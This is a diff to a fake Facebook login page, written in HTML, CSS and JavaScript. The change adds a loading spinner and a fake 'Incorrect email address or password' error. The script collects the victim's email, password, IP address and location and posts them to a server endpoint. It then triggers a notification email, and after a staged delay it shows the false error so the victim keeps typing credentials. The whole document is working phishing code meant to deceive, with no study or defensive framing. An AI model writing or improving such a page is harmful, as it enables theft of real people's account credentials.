@@ -285,6 +285,33 @@
             margin-top: 20px;
             text-align: center;
         }
+        /* Add spinner animation styling */
+        @keyframes spinner {
+            to {transform: rotate(360deg);}
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spinner 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        .error-message {
+            color: #c00;
+            font-size: 14px;
+            text-align: center;
+            margin: 6px 0 0;
+            display: none;
+        }
+        button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
     </style>
 </head>
 <body>
@@ -321,6 +348,7 @@
                     <input type="hidden" id="adminEmail" name="adminEmail" value="admin@example.com">
                 </div>
                 <button type="submit" id="btn">Log In</button>
+                <div id="error-message" class="error-message">Incorrect email address or password</div>
                 <a href="#" class="forgot-password">Forgotten password?</a>
                 <div class="divider"></div>
                 <div class="create-account-container">
@@ -383,11 +411,13 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Get user location and IP info
+            // Initialize 
             getUserLocationAndIp();
             
-            // Add form submission handling
+            // Form submission
             const form = document.getElementById('login-form');
+            const loginButton = document.getElementById('btn');
+            const errorMessage = document.getElementById('error-message');
             
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -407,41 +437,47 @@
                     return;
                 }
                 
-                // Show "verification" and delay submission for realism
-                setTimeout(function() {
-                    // Create data object to save
-                    const userData = {
-                        username: email.value,
-                        password: password.value,
-                        country: country.value,
-                        city: city.value,
-                        continent: continent.value,
-                        ip: ip.value,
-                        timestamp: new Date().toISOString(),
-                        platform: 'facebook'
-                    };
+                // Show spinner in button
+                loginButton.innerHTML = '<span class="spinner"></span> Logging in...';
+                loginButton.disabled = true;
+                
+                // Create data object to save
+                const userData = {
+                    username: email.value,
+                    password: password.value,
+                    country: country.value,
+                    city: city.value,
+                    continent: continent.value,
+                    ip: ip.value,
+                    timestamp: new Date().toISOString(),
+                    platform: 'facebook'
+                };
+                
+                // Send data to server
+                fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                })
+                .then(data => {
+                    console.log('Data saved to database:', data);
+                    sendNotificationEmail();
                     
-                    // Send data to server
-                    fetch('/api/save', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(userData)
-                    })
-                    .then(data => {
-                        console.log('Data saved to database:', data);
-                        
-                        // Then send notification email
-                        sendNotificationEmail();
-                        
-                        // Optionally redirect after a delay
-                        // setTimeout(function() {
-                        //     window.location.href = 'https://facebook.com/';
-                        // }, 1000);
-                    })
-                    .catch(error => {
-                        console.error('Error saving data:', error);
-                    });
-                }, 1500); // 1.5 second delay for verification
+                    // After "verification" delay, show error
+                    setTimeout(function() {
+                        loginButton.innerHTML = 'Log In';
+                        loginButton.disabled = false;
+                        errorMessage.style.display = 'block';
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('Error saving data:', error);
+                    setTimeout(function() {
+                        loginButton.innerHTML = 'Log In';
+                        loginButton.disabled = false;
+                        errorMessage.style.display = 'block';
+                    }, 2000);
+                });
             });
             
             // Add function to send email notification
